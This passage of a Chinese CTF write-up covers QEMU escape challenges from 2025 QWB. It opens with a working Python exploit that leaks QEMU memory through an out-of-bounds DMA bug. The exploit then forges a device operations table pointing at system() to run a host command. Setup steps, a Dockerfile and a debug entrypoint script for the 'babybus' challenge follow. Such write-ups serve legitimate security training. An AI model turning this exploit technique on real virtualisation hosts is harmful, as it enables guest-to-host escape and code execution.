ram_out</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        从 dma_buf 起点往前 neg_off 字节开始，读取 nbytes 到来宾 RAM。</span></span><br><span class="line"><span class="string">        约束：0 &lt; neg_off &lt;= nbytes &lt;= 0x1000</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">assert</span> <span class="number">0</span> &lt; neg_off &lt;= <span class="number">0x1000</span></span><br><span class="line">        <span class="keyword">assert</span> nbytes &gt;= neg_off <span class="keyword">and</span> nbytes &lt;= <span class="number">0x1000</span></span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.set_size(<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># 描述符0：cmd=1（device-&gt;system）</span></span><br><span class="line">        <span class="variable language_">self</span>.wr_desc(<span class="number">0</span>,</span><br><span class="line">                     src=u64_neg(neg_off),</span><br><span class="line">                     dst=ram_out,</span><br><span class="line">                     cnt=nbytes,</span><br><span class="line">                     cmd=<span class="number">1</span></span><br><span class="line">                     )</span><br><span class="line">        <span class="variable language_">self</span>.go()</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.qt.mem_read(ram_out, nbytes)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">oob_write_before</span>(<span class="params">self, neg_off, payload: <span class="built_in">bytes</span>, ram_src=<span class="number">0x220000</span>, pad_byte=<span class="string">b&#x27;\x00&#x27;</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        从 dma_buf 起点往前 neg_off 字节开始，写入 payload。</span></span><br><span class="line"><span class="string">        为通过检查：需要 cnt &gt;= neg_off 且 cnt &lt;= 0x1000。</span></span><br><span class="line"><span class="string">        若 len(payload) &lt; neg_off，会自动零填到 neg_off（会部分覆盖缓冲区内）。</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">assert</span> <span class="number">0</span> &lt; neg_off &lt;= <span class="number">0x1000</span></span><br><span class="line">        cnt = <span class="built_in">max</span>(<span class="built_in">len</span>(payload), neg_off)</span><br><span class="line">        <span class="keyword">assert</span> cnt &lt;= <span class="number">0x1000</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(payload) &lt; cnt:</span><br><span class="line">            payload = payload + pad_byte * (cnt - <span class="built_in">len</span>(payload))</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.qt.mem_write(ram_src, payload)</span><br><span class="line">        <span class="variable language_">self</span>.set_size(<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># 描述符0：cmd=0（system-&gt;device）</span></span><br><span class="line">        <span class="variable language_">self</span>.wr_desc(<span class="number">0</span>,</span><br><span class="line">                     src=ram_src,</span><br><span class="line">                     dst=u64_neg(neg_off),</span><br><span class="line">                     cnt=cnt,</span><br><span class="line">                     cmd=<span class="number">0</span></span><br><span class="line">                     )</span><br><span class="line">        <span class="variable language_">self</span>.go()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------- optional gdb attach --------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_qemu_pid</span>(<span class="params">ppid</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        exe = os.path.basename(os.readlink(<span class="string">f&quot;/proc/<span class="subst">&#123;ppid&#125;</span>/exe&quot;</span>))</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> ppid</span><br><span class="line">    <span class="keyword">if</span> exe.startswith(<span class="string">&quot;qemu-system&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> ppid</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;/proc/<span class="subst">&#123;ppid&#125;</span>/task/<span class="subst">&#123;ppid&#125;</span>/children&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            kids = [<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> f.read().strip().split()]</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> kids:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                name = os.path.basename(os.readlink(<span class="string">f&quot;/proc/<span class="subst">&#123;k&#125;</span>/exe&quot;</span>))</span><br><span class="line">                <span class="keyword">if</span> name.startswith(<span class="string">&quot;qemu-system&quot;</span>):</span><br><span class="line">                    <span class="keyword">return</span> k</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> ppid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">maybe_attach_gdb</span>(<span class="params">proc</span>):</span><br><span class="line">    <span class="keyword">if</span> os.getenv(<span class="string">&#x27;GDB&#x27;</span>):</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        qpid = find_qemu_pid(proc.pid)</span><br><span class="line">        gdbscript = os.getenv(<span class="string">&#x27;GDBSCRIPT&#x27;</span>, <span class="string">&#x27;b system\nc\n&#x27;</span>)</span><br><span class="line">        <span class="comment"># gdbscript = os.getenv(&#x27;GDBSCRIPT&#x27;, &#x27;b qwb_mmio_read\nb qwb_mmio_write\nb qwb_do_dma\nc\n&#x27;)</span></span><br><span class="line">        log.info(<span class="string">f&quot;Attaching gdb to PID <span class="subst">&#123;qpid&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            gdb.attach(qpid, gdbscript=gdbscript, exe=<span class="string">&quot;./qemu-system-x86_64&quot;</span>)</span><br><span class="line">            pause()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            log.warning(<span class="string">f&quot;GDB attach failed: <span class="subst">&#123;e&#125;</span> (tip: sudo sysctl -w kernel.yama.ptrace_scope=0)&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    qt = QTest([<span class="string">&quot;./launch.sh&quot;</span>])</span><br><span class="line">    qwb = QWB(qt, base=<span class="number">0xf0000000</span>)</span><br><span class="line"></span><br><span class="line">    qemu = ELF(<span class="string">&quot;./qemu-system-x86_64&quot;</span>)</span><br><span class="line">    leak = qwb.oob_read_before(neg_off=<span class="number">0x4b8</span>, nbytes=<span class="number">0x600</span>, ram_out=<span class="number">0x300000</span>)</span><br><span class="line">    <span class="built_in">print</span>(hexdump(leak))</span><br><span class="line">    QWBState_addr = u64(leak[<span class="number">0x8</span>:<span class="number">0x8</span> + <span class="number">8</span>])</span><br><span class="line">    success(<span class="string">&quot;QWBState_addr: &quot;</span> + <span class="built_in">hex</span>(QWBState_addr))</span><br><span class="line">    qemu.address = u64(leak[<span class="number">0x30</span>:<span class="number">0x30</span> + <span class="number">8</span>]) - qemu.sym[<span class="string">&#x27;memory_region_destructor_none&#x27;</span>]</span><br><span class="line">    success(<span class="string">&quot;qemu base: &quot;</span> + <span class="built_in">hex</span>(qemu.address))</span><br><span class="line"></span><br><span class="line">    maybe_attach_gdb(qt.p)  <span class="comment"># GDB=1 时附加</span></span><br><span class="line"></span><br><span class="line">    leak = <span class="built_in">bytearray</span>(leak)</span><br><span class="line"></span><br><span class="line">    leak[<span class="number">0</span>:<span class="number">8</span>] = p64(QWBState_addr + <span class="number">0xe00</span>)</span><br><span class="line">    qwb_mmio_ops = flat(</span><br><span class="line">        <span class="comment"># function pointers (8 bytes each)</span></span><br><span class="line">        p64(qemu.plt[<span class="string">&#x27;system&#x27;</span>]),  <span class="comment"># read</span></span><br><span class="line">        p64(qemu.plt[<span class="string">&#x27;system&#x27;</span>]),  <span class="comment"># write</span></span><br><span class="line">        p64(<span class="number">0</span>),  <span class="comment"># read_with_attrs (NULL)</span></span><br><span class="line">        p64(<span class="number">0</span>),  <span class="comment"># write_with_attrs (NULL)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># endianness (assume 4 bytes) + 4 bytes padding to keep 8-byte alignment</span></span><br><span class="line">        p32(<span class="number">0</span>),  <span class="comment"># endianness (uint32)</span></span><br><span class="line">        p32(<span class="number">0</span>),  <span class="comment"># padding</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># valid sub-struct (assume fields are 32-bit then a pointer)</span></span><br><span class="line">        p32(<span class="number">4</span>),  <span class="comment"># valid.min_access_size = 4</span></span><br><span class="line">        p32(<span class="number">8</span>),  <span class="comment"># valid.max_access_size = 8</span></span><br><span class="line">        p32(<span class="number">0</span>),  <span class="comment"># valid.unaligned = false (0)</span></span><br><span class="line">        p32(<span class="number">0</span>),  <span class="comment"># padding to align the next pointer</span></span><br><span class="line">        p64(<span class="number">0</span>),  <span class="comment"># valid.accepts = 0 (NULL / placeholder)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># impl sub-struct (assume 3 x 32-bit fields; pad to 8-byte boundary)</span></span><br><span class="line">        p32(<span class="number">4</span>),  <span class="comment"># impl.min_access_size = 4</span></span><br><span class="line">        p32(<span class="number">8</span>),  <span class="comment"># impl.max_access_size = 8</span></span><br><span class="line">        p32(<span class="number">0</span>),  <span class="comment"># impl.unaligned = false</span></span><br><span class="line">        p32(<span class="number">0</span>),  <span class="comment"># padding</span></span><br><span class="line">    )</span><br><span class="line">    cmd = <span class="string">&quot;/usr/bin/gnome-calculator&quot;</span></span><br><span class="line"></span><br><span class="line">    leak[<span class="number">0x4b8</span>:<span class="number">0x4b8</span> + <span class="built_in">len</span>(qwb_mmio_ops)] = qwb_mmio_ops</span><br><span class="line">    leak[<span class="number">0x4b8</span> + <span class="built_in">len</span>(qwb_mmio_ops):<span class="number">0x4b8</span> + <span class="built_in">len</span>(qwb_mmio_ops) + <span class="built_in">len</span>(cmd)] = cmd.encode()</span><br><span class="line">    leak[<span class="number">0x8</span>:<span class="number">0x8</span> + <span class="number">8</span>] = p64(QWBState_addr + <span class="number">0xe00</span> + <span class="built_in">len</span>(qwb_mmio_ops))</span><br><span class="line"></span><br><span class="line">    leak = <span class="built_in">bytes</span>(leak)</span><br><span class="line"></span><br><span class="line">    qwb.oob_write_before(neg_off=<span class="number">0x4b8</span>, payload=leak)</span><br><span class="line">    pause()</span><br><span class="line">    qwb.oob_write_before(neg_off=<span class="number">0x4b8</span>, payload=leak)</span><br><span class="line"></span><br><span class="line">    qt.p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>

<h1 id="2025qwb-babybus"><a href="#2025qwb-babybus" class="headerlink" title="2025qwb-babybus"></a>2025qwb-babybus</h1><h2 id="环境搭建-5"><a href="#环境搭建-5" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="编译-QEMU"><a href="#编译-QEMU" class="headerlink" title="编译 QEMU"></a>编译 QEMU</h3><p>由于题目没有符号，因此我们需要编译一个同版本的 QEMU，然后吧该 QEMU 二进制文件的签名以及结构体信息导入到题目提供的 QEMU 中。</p>
<p>通过运行程序或者搜索字符串可以定位到 QEMU 的版本是 <code>10.1.0</code>：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">QEMU emulator version 10.1.0 (v10.1.0-2-g07e6d49-dirty)</span><br><span class="line">Copyright (c) 2003-2025 Fabrice Bellard and the QEMU Project developers</span><br></pre></td></tr></table></figure></div>

<p>首先下载编译所需依赖：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1) 启用 deb-src（若已启用可跳过）</span></span><br><span class="line"><span class="built_in">sudo</span> sed -i <span class="string">&#x27;s/^# deb-src/deb-src/&#x27;</span> /etc/apt/sources.list</span><br><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2) 安装打包方提供的构建依赖（覆盖面广、省心）</span></span><br><span class="line"><span class="built_in">sudo</span> apt build-dep -y qemu     <span class="comment"># 若提示必须启用源码源，请确保上一步已做</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3) 再补充一些常用可选依赖（图形/声卡/USB/加速等特性常用）</span></span><br><span class="line"><span class="built_in">sudo</span> apt install -y git build-essential ninja-build meson pkg-config python3 \</span><br><span class="line">  libglib2.0-dev libpixman-1-dev zlib1g-dev libfdt-dev \</span><br><span class="line">  libsdl2-dev libgtk-3-dev libspice-server-dev libspice-protocol-dev \</span><br><span class="line">  libpulse-dev libasound2-dev libusb-1.0-0-dev libusbredirhost-dev libusbredirparser-dev \</span><br><span class="line">  libslirp-dev libiscsi-dev libnfs-dev libaio-dev liburing-dev libnuma-dev \</span><br><span class="line">  libzstd-dev liblz4-dev libsnappy-dev bzip2 libbz2-dev lzop liblzo2-dev \</span><br><span class="line">  libcapstone-dev libseccomp-dev libcap-ng-dev</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> apt install -y python3-venv python3-pip python3-setuptools python3-wheel</span><br></pre></td></tr></table></figure></div>

<p>然后编译：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p ~/src &amp;&amp; <span class="built_in">cd</span> ~/src</span><br><span class="line">curl -LO https://download.qemu.org/qemu-10.1.0.tar.xz</span><br><span class="line">tar -xf qemu-10.1.0.tar.xz</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ~/src/qemu-10.1.0</span><br><span class="line"><span class="built_in">rm</span> -rf build-static</span><br><span class="line"><span class="built_in">mkdir</span> build-static &amp;&amp; <span class="built_in">cd</span> build-static</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关键：禁用 PIE + 给 C/链接都加 no-PIE，避免子项目/测试用默认 PIE</span></span><br><span class="line">../configure \</span><br><span class="line">  --prefix=<span class="variable">$HOME</span>/.local/qemu-10.1-static \</span><br><span class="line">  --target-list=x86_64-softmmu \</span><br><span class="line">  --disable-capstone --disable-slirp --disable-spice \</span><br><span class="line">  --disable-gtk --disable-sdl --disable-virglrenderer \</span><br><span class="line">  --disable-curl --disable-libssh --disable-libiscsi --disable-libnfs \</span><br><span class="line">  --disable-plugins --disable-tools \</span><br><span class="line">  --enable-debug --disable-strip \</span><br><span class="line">  --disable-pie \</span><br><span class="line">  -Ddefault_library=static \</span><br><span class="line">  -Db_pie=<span class="literal">false</span> \</span><br><span class="line">  -Dc_args=<span class="string">&#x27;-fno-PIE&#x27;</span> \</span><br><span class="line">  -Dc_link_args=<span class="string">&#x27;-no-pie&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不要用 make（会跑 &quot;all&quot; 把 link-test 也拉进来），直接定点构建</span></span><br><span class="line">ninja -C . qemu-system-x86_64</span><br></pre></td></tr></table></figure></div>

<h3 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h3><p><code>Dockerfile</code> 中需要添加 <code>gdbserver</code> 安装以及开放端口 2345：</p>
<div class="code-container" data-rel="Dockerfile"><figure class="iseeu highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">24.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get install -y \</span></span><br><span class="line"><span class="language-bash">    libglib2.0-0 \</span></span><br><span class="line"><span class="language-bash">    libpixman-1-0 \</span></span><br><span class="line"><span class="language-bash">    libusb-1.0-0 \</span></span><br><span class="line"><span class="language-bash">    libgnutls30 \</span></span><br><span class="line"><span class="language-bash">    libslirp0 \</span></span><br><span class="line"><span class="language-bash">    libfdt1 \</span></span><br><span class="line"><span class="language-bash">    gdbserver \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">rm</span> -rf /var/lib/apt/lists/*</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制并设置入口脚本</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> docker-entrypoint.sh /usr/local/bin/docker-entrypoint.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /usr/local/bin/docker-entrypoint.sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> useradd -m ctf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /home/ctf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制编译好的二进制与启动脚本</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> qemu-system-x86_64 qemu-system-x86_64</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> run.sh run.sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x qemu-system-x86_64 run.sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> ctf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保持原有默认端口</span></span><br><span class="line"><span class="keyword">ENV</span> PORT=<span class="number">1502</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 暴露 Modbus 与 gdbserver</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">1502</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">2345</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;/usr/local/bin/docker-entrypoint.sh&quot;</span>]</span></span><br></pre></td></tr></table></figure></div>

<p><strong>在入口脚本里增加一个 <code>DEBUG_SERVER</code> 模式</strong>（监听 2345）</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env sh</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">FLAG_PATH=/home/ctf/flag</span><br><span class="line">FLAG_MODE=M_ECHO</span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$&#123;ICQ_FLAG&#125;</span> ];<span class="keyword">then</span></span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$FLAG_MODE</span> <span class="keyword">in</span></span><br><span class="line">        <span class="string">&quot;M_ECHO&quot;</span>)</span><br><span class="line">            <span class="built_in">echo</span> -n <span class="variable">$&#123;ICQ_FLAG&#125;</span> &gt; <span class="variable">$&#123;FLAG_PATH&#125;</span></span><br><span class="line">            FILE_MODE=755 <span class="comment"># 注意这里的权限，flag的权限一定要注意，是所有用户可读，还是只有root可读</span></span><br><span class="line">            <span class="built_in">chmod</span> <span class="variable">$&#123;FILE_MODE&#125;</span> <span class="variable">$&#123;FLAG_PATH&#125;</span></span><br><span class="line">            ;;</span><br><span class="line">        <span class="string">&quot;M_SED&quot;</span>)</span><br><span class="line">            <span class="comment">#sed -i &quot;s/flag&#123;x*&#125;/$&#123;ICQ_FLAG&#125;/&quot; $&#123;FLAG_PATH&#125;</span></span><br><span class="line">            sed -i -r <span class="string">&quot;s/flag\&#123;.*\&#125;/<span class="variable">$&#123;ICQ_FLAG&#125;</span>/&quot;</span> <span class="variable">$&#123;FLAG_PATH&#125;</span></span><br><span class="line">            ;;</span><br><span class="line">        <span class="string">&quot;M_SQL&quot;</span>)</span><br><span class="line">            <span class="comment"># sed -i -r &quot;s/flag\&#123;.*\&#125;/$&#123;ICQ_FLAG&#125;/&quot; $&#123;FLAG_PATH&#125;</span></span><br><span class="line">            <span class="comment"># mysql -uroot -proot &lt; $&#123;FLAG_PATH&#125;</span></span><br><span class="line">            ;;</span><br><span class="line">        *)</span><br><span class="line">            ;;</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line">    <span class="built_in">echo</span> [+] ICQ_FLAG OK</span><br><span class="line">    <span class="built_in">unset</span> ICQ_FLAG</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> [!] no ICQ_FLAG</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#del eci env</span></span><br><span class="line"><span class="built_in">rm</span> -rf /etc/profile.d/pouchenv.sh</span><br><span class="line"><span class="built_in">rm</span> -rf /etc/instanceInfo</span><br><span class="line"></span><br><span class="line"><span class="comment"># sth</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -eu</span><br><span class="line"></span><br><span class="line"><span class="comment"># 环境参数</span></span><br><span class="line">HOST=<span class="string">&quot;<span class="variable">$&#123;HOST:-0.0.0.0&#125;</span>&quot;</span></span><br><span class="line">PORT=<span class="string">&quot;<span class="variable">$&#123;PORT:-1502&#125;</span>&quot;</span></span><br><span class="line">RESTART_DELAY=<span class="string">&quot;<span class="variable">$&#123;RESTART_DELAY:-1&#125;</span>&quot;</span></span><br><span class="line">UNIT_ID=<span class="string">&quot;<span class="variable">$&#123;UNIT_ID:-1&#125;</span>&quot;</span></span><br><span class="line">TIMER_RESTART=<span class="string">&quot;<span class="variable">$&#123;TIMER_RESTART:-20&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># === DEBUG_SERVER（gdbserver 监听 2345）===</span></span><br><span class="line">DEBUG_SERVER=<span class="string">&quot;<span class="variable">$&#123;DEBUG_SERVER:-0&#125;</span>&quot;</span></span><br><span class="line">GDB_PORT=<span class="string">&quot;<span class="variable">$&#123;GDB_PORT:-2345&#125;</span>&quot;</span></span><br><span class="line"><span class="comment"># 是否在 gdbserver 结束后自动重启（默认 0=不重启）</span></span><br><span class="line">DEBUG_AUTORESTART=<span class="string">&quot;<span class="variable">$&#123;DEBUG_AUTORESTART:-0&#125;</span>&quot;</span></span><br><span class="line">DEBUG_RESTART_DELAY=<span class="string">&quot;<span class="variable">$&#123;DEBUG_RESTART_DELAY:-1&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$DEBUG_SERVER</span>&quot;</span> = <span class="string">&quot;1&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;[entrypoint] DEBUG_SERVER=1: gdbserver on :<span class="variable">$GDB_PORT</span> (TIMER_RESTART disabled)&quot;</span></span><br><span class="line">  <span class="comment"># 调试模式不受 20 秒重启限制</span></span><br><span class="line">  TIMER_RESTART=0</span><br><span class="line">  <span class="built_in">set</span> +e</span><br><span class="line">  <span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">set</span> -x</span><br><span class="line">    gdbserver 0.0.0.0:<span class="variable">$&#123;GDB_PORT&#125;</span> /home/ctf/qemu-system-x86_64 \</span><br><span class="line">      -machine none \</span><br><span class="line">      -nographic \</span><br><span class="line">      -nodefaults \</span><br><span class="line">      -chardev socket,<span class="built_in">id</span>=mbus,host=0.0.0.0,port=1502,server=on,<span class="built_in">wait</span>=off \</span><br><span class="line">      -device modbus-rtu,chardev=mbus,unit-id=1</span><br><span class="line">    exit_code=$?</span><br><span class="line">    <span class="built_in">set</span> +x</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$&#123;DEBUG_AUTORESTART&#125;</span>&quot;</span> != <span class="string">&quot;1&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;[entrypoint] gdbserver exited with code <span class="variable">$&#123;exit_code&#125;</span>, not restarting (DEBUG_AUTORESTART=0)&quot;</span></span><br><span class="line">      <span class="built_in">exit</span> <span class="string">&quot;<span class="variable">$&#123;exit_code&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;[entrypoint] gdbserver exited with code <span class="variable">$&#123;exit_code&#125;</span>, restarting in <span class="variable">$&#123;DEBUG_RESTART_DELAY&#125;</span>s&quot;</span></span><br><span class="line">    <span class="built_in">sleep</span> <span class="string">&quot;<span class="variable">$&#123;DEBUG_RESTART_DELAY&#125;</span>&quot;</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment"># === DEBUG_SERVER 结束 ===</span></span><br><span class="line"></span><br><span class="line">GEN_RUN=<span class="string">&quot;/home/ctf/run.sh&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">trap</span> <span class="string">&#x27;echo &quot;[entrypoint] received signal, exiting&quot;; exit 0&#x27;</span> INT TERM</span><br><span class="line"></span><br><span class="line">start_time=$(<span class="built_in">date</span> +%s)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;[entrypoint] starting QEMU on <span class="variable">$&#123;HOST&#125;</span>:<span 